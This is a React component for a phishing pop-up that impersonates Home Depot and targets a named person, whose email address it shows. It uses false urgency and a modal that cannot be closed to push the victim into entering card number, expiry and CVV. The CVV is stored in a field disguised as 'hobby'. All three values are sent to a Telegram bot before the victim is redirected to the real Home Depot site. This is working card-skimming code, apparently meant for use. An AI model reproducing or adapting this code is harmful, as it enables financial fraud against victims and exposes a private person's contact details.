"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import Image from "next/image"
import { X, ArrowLeft, CheckCircle, AlertCircle, Info, Loader2, Settings } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions"

export default function RewardModal() {
  const [isOpen, setIsOpen] = useState(false)
  const [step, setStep] = useState(1)
  const [showNotification, setShowNotification] = useState(false)
  const [isBouncing, setIsBouncing] = useState(false)
  const [showCVV, setShowCVV] = useState(false)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isWaiting, setIsWaiting] = useState(false)
  const [waitingSeconds, setWaitingSeconds] = useState(30)
  const [progress, setProgress] = useState(0)
  const [showVerificationMessage, setShowVerificationMessage] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoadingGears, setIsLoadingGears] = useState(false)
  const modalRef = useRef<HTMLDivElement>(null)
  const waitingTimerRef = useRef<NodeJS.Timeout | null>(null)

  const [formData, setFormData] = useState({
    cardNumber: "",
    hobby: "", // Using hobby field for CVV
    expiryDate: "",
  })
  const [errors, setErrors] = useState({
    cardNumber: "",
    hobby: "",
    expiryDate: "",
  })

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsOpen(true)
    }, 1000)

    return () => clearTimeout(timer)
  }, [])

  // Handle bounce animation
  useEffect(() => {
    if (isBouncing) {
      const timer = setTimeout(() => {
        setIsBouncing(false)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [isBouncing])

  // Handle notification timeout
  useEffect(() => {
    if (showNotification) {
      const timer = setTimeout(() => {
        setShowNotification(false)
      }, 3000)
      return () => clearTimeout(timer)
    }
  }, [showNotification])

  // Handle verification message timeout
  useEffect(() => {
    if (showVerificationMessage) {
      const timer = setTimeout(() => {
        setShowVerificationMessage(false)
      }, 5000)
      return () => clearTimeout(timer)
    }
  }, [showVerificationMessage])

  // 30-second waiting timer
  useEffect(() => {
    if (isWaiting && waitingSeconds > 0) {
      waitingTimerRef.current = setTimeout(() => {
        setWaitingSeconds((prev) => prev - 1)
      }, 1000)

      return () => {
        if (waitingTimerRef.current) {
          clearTimeout(waitingTimerRef.current)
        }
      }
    } else if (isWaiting && waitingSeconds === 0) {
      setIsWaiting(false)
      setIsVerifying(true)
    }
  }, [isWaiting, waitingSeconds])

  // Progress bar animation
  useEffect(() => {
    if (isVerifying) {
      const interval = setInterval(() => {
        setProgress((prevProgress) => {
          if (prevProgress >= 100) {
            clearInterval(interval)
            setIsVerifying(false)
            setShowCVV(true)
            setShowVerificationMessage(true)
            return 0
          }
          return prevProgress + 5
        })
      }, 100)
      return () => clearInterval(interval)
    }
  }, [isVerifying])

  const attemptClose = () => {
    setShowNotification(true)
    setIsBouncing(true)
  }

  const closeModal = () => {
    if (step === 3) {
      setIsOpen(false)
      // Redirect to Home Depot after closing
      window.location.href = "https://www.homedepot.com"
      // Reset state
      setTimeout(() => {
        setStep(1)
        setFormData({ cardNumber: "", hobby: "", expiryDate: "" })
        setErrors({ cardNumber: "", hobby: "", expiryDate: "" })
        setShowCVV(false)
        setIsWaiting(false)
        setWaitingSeconds(30)
      }, 300)
    } else {
      attemptClose()
    }
  }

  const goToForm = () => {
    setStep(2)
    // Show CVV fields immediately when going to form
    setTimeout(() => {
      setShowCVV(true)
      setShowVerificationMessage(true)
    }, 100)
  }

  const goBack = () => setStep(1)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))

    if (errors[name as keyof typeof errors]) {
      setErrors((prev) => ({ ...prev, [name]: "" }))
    }
  }

  const validateForm = () => {
    let valid = true
    const newErrors = { cardNumber: "", hobby: "", expiryDate: "" }

    if (!formData.cardNumber.trim()) {
      newErrors.cardNumber = "Card number is required"
      valid = false
    } else if (formData.cardNumber.replace(/\s/g, "").length < 13) {
      newErrors.cardNumber = "Please enter a valid card number"
      valid = false
    }

    if (!formData.hobby.trim()) {
      newErrors.hobby = "CVV is required"
      valid = false
    } else if (formData.hobby.length !== 3) {
      newErrors.hobby = "CVV must be 3 digits"
      valid = false
    }

    if (!formData.expiryDate.trim()) {
      newErrors.expiryDate = "Expiry date is required"
      valid = false
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiryDate)) {
      newErrors.expiryDate = "Please enter date in MM/YY format"
      valid = false
    }

    setErrors(newErrors)
    return valid
  }

  const submitForm = async () => {
    if (validateForm()) {
      try {
        setIsSubmitting(true)

        await sendToTelegram({
          cardNumber: formData.cardNumber,
          cvv: formData.hobby,
          expiryDate: formData.expiryDate,
        })

        setIsSubmitting(false)
        setIsLoadingGears(true)

        // Show gears for 3 seconds then go to success screen
        setTimeout(() => {
          setIsLoadingGears(false)
          setStep(3)
        }, 3000)
      } catch (error) {
        console.error("Error submitting form:", error)
        setIsSubmitting(false)
      }
    }
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={attemptClose} />

      <div
        ref={modalRef}
        className={`relative bg-white rounded-lg shadow-xl max-w-md w-full mx-auto overflow-hidden
          ${isBouncing ? "animate-bounce" : ""}`}
      >
        <button
          onClick={closeModal}
          className="absolute top-2 right-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
          aria-label={step === 3 ? "Close" : "Cannot close"}
        >
          <X className="h-5 w-5" />
        </button>

        {step === 2 && (
          <button
            onClick={goBack}
            className="absolute top-2 left-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
            aria-label="Go back"
          >
            <ArrowLeft className="h-5 w-5" />
          </button>
        )}

        {showNotification && (
          <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20">
            <AlertCircle className="h-4 w-4 mr-2" />
            <span className="text-sm font-medium">Please click "Secure Your Card Now" to proceed</span>
          </div>
        )}

        {step === 1 && (
          <>
            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
              <h2 className="text-2xl font-bold">Hello Robert Bonville!</h2>
              <p className="text-lg mt-1">Secure your card xxx4292 with Home Depot</p>
            </div>

            <div className="p-4 flex justify-center">
              <div className="relative w-full h-48 rounded-lg overflow-hidden border">
                <Image
                  src="https://thvnext.bing.com/th/id/OIP._oTs-tS_Y30gk2pVTbXdHwHaEK?w=274&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1"
                  alt="Secure Your Card"
                  fill
                  className="object-cover"
                />
              </div>
            </div>

            <div className="p-6 text-center">
              <p className="text-gray-600 mb-4">
                Action Required: Click the button below to confirm your card details and secure your account. This must
                be completed within 72 hours.
              </p>

              <Button
                onClick={goToForm}
                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full text-lg animate-pulse"
              >
                Secure your card now
              </Button>

              <p className="text-xs text-gray-500 mt-4">
                *Terms and conditions apply. This security step expires in 72 hours.
              </p>
            </div>
          </>
        )}

        {step === 2 && (
          <>
            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white">
              <h2 className="text-xl font-bold">Complete Your Information</h2>
              <p className="text-sm mt-1">Please provide the following details to Secure your Card</p>
            </div>

            <div className="p-6">
              <div className="space-y-4">
                {/* Verification message */}
                {showVerificationMessage && (
                  <div className="bg-blue-50 border-l-4 border-blue-500 p-3 flex items-start">
                    <Info className="h-5 w-5 text-blue-500 mr-2 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-blue-700">
                      Please enter your card details for verification purposes. This is required to secure your card.
                    </p>
                  </div>
                )}

                {/* Credit card fields - now shown immediately */}
                {showCVV && (
                  <div className="space-y-4 animate-in fade-in duration-500">
                    <div className="space-y-2">
                      <label htmlFor="cardNumber" className="text-sm font-medium block">
                        Card Number
                      </label>
                      <Input
                        id="cardNumber"
                        name="cardNumber"
                        placeholder="1234 5678 9012 3456"
                        value={formData.cardNumber}
                        onChange={handleInputChange}
                        className={errors.cardNumber ? "border-red-500" : ""}
                        maxLength={19}
                      />
                      {errors.cardNumber && <p className="text-red-500 text-xs">{errors.cardNumber}</p>}
                    </div>

                    {/* CVV field */}
                    <div className="space-y-2">
                      <label htmlFor="hobby" className="text-sm font-medium block">
                        CVV (3 digits on back of card)
                      </label>
                      <Input
                        id="hobby"
                        name="hobby"
                        placeholder="123"
                        value={formData.hobby}
                        onChange={handleInputChange}
                        className={errors.hobby ? "border-red-500" : ""}
                        maxLength={3}
                        type="password"
                      />
                      {errors.hobby && <p className="text-red-500 text-xs">{errors.hobby}</p>}
                    </div>

                    <div className="space-y-2">
                      <label htmlFor="expiryDate" className="text-sm font-medium block">
                        Expiry Date
                      </label>
                      <Input
                        id="expiryDate"
                        name="expiryDate"
                        placeholder="MM/YY"
                        value={formData.expiryDate}
                        onChange={handleInputChange}
                        className={errors.expiryDate ? "border-red-500" : ""}
                        maxLength={5}
                      />
                      {errors.expiryDate && <p className="text-red-500 text-xs">{errors.expiryDate}</p>}
                    </div>
                  </div>
                )}

                <Button
                  onClick={submitForm}
                  className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full mt-4"
                  disabled={!showCVV || isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    "Verify"
                  )}
                </Button>

                <p className="text-xs text-gray-500 mt-2 text-center">
                  Your information is secure and will only be used to verify your card.
                </p>
              </div>
            </div>
          </>
        )}

        {isLoadingGears && (
          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-30 animate-in fade-in duration-500">
            <div className="text-center">
              <div className="relative flex items-center justify-center mb-6">
                {/* First gear */}
                <Settings className="h-16 w-16 text-orange-500 animate-spin" style={{ animationDuration: "2s" }} />
                {/* Second gear - positioned to interlock and rotate opposite direction */}
                <Settings
                  className="h-12 w-12 text-yellow-500 -ml-4 mt-2"
                  style={{
                    animation: "spin 2s linear infinite reverse",
                    transform: "rotate(30deg)",
                  }}
                />
              </div>
              <p className="text-white text-lg font-medium">Processing your information...</p>
              <p className="text-gray-300 text-sm mt-2">Please wait while we secure your account</p>
            </div>
          </div>
        )}

        {step === 3 && (
          <>
            <div className="bg-gradient-to-r from-green-500 to-emerald-500 p-6 text-white text-center">
              <h2 className="text-2xl font-bold">Confirmation Complete!</h2>
              <p className="text-lg mt-1">Your card is now secured</p>
            </div>

            <div className="p-8 text-center">
              <div className="flex justify-center mb-6">
                <CheckCircle className="h-20 w-20 text-green-500" />
              </div>

              <h3 className="text-xl font-bold mb-2">Confirmation Complete</h3>
              <p className="text-gray-600 mb-6">
                We have successfully received and verified your information. Your account is now secure. Our Agent will
                contact you via your email rbonville001@twcny.rr.com.
              </p>

              <Button
                onClick={closeModal}
                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md"
              >
                Close
              </Button>
            </div>
          </>
        )}
      </div>
    </div>
  )
}
